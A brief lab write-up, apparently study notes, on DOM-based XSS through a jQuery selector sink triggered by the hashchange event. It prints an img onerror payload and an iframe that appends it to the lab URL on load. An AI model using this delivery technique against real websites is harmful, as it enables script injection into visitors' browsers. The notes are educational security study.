## Overview
Explored DOM XSS using jQuery selector and hashchange event.

## Key Concept
User input from location.hash is passed into jQuery and executed when the hash changes.

## Payload
#<img src=x onerror=print()>

## Exploit
<iframe src="LAB_URL" onload="this.src+='#<img src=x onerror=print()>'"></iframe>

## Insight
Some XSS vulnerabilities require event triggering and controlled delivery, not just direct payload injection.
